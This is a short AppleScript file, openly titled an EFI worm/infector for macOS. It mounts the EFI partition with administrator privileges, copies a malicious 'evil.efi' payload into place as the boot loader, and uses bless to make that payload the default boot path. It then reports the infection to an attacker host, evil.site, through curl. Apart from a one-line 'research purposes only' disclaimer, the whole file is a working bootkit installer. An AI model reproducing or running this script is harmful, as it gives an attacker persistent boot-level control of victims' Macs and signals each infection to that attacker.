-- 🧬 EFI Worm / Infector – AppleScript Wrapper
-- This script mounts the EFI partition, injects a malicious .efi bootloader,
-- and sets it as the default boot path using `bless`.

-- ⚠️ REQUIRES ADMIN ACCESS
-- ⚠️ FOR RESEARCH PURPOSES ONLY

-- Step 1: Locate EFI Partition (assumes /dev/disk0s1)
try
	do shell script "diskutil list | grep EFI"
on error
	display dialog "EFI not found. Are you on Apple Silicon or SIP locked system?"
	return
end try

-- Step 2: Mount EFI Partition
try
	do shell script "diskutil mount /dev/disk0s1" with administrator privileges
end try

-- Step 3: Copy payload to EFI/BOOT
try
	do shell script "mkdir -p /Volumes/EFI/EFI/Boot" with administrator privileges
	do shell script "cp ~/Desktop/evil.efi /Volumes/EFI/EFI/Boot/bootx64.efi" with administrator privileges
end try

-- Step 4: Make it the default bootloader
-- You can skip this if you want the system to boot normally unless manually triggered
try
	do shell script "bless --mount /Volumes/EFI --setBoot --file /Volumes/EFI/EFI/Boot/bootx64.efi" with administrator privileges
end try

-- Optional Callback
try
	do shell script "curl -s https://evil.site/log?efi_infected=yes &"
end try

display dialog "EFI infection complete." buttons {"OK"} default button 1
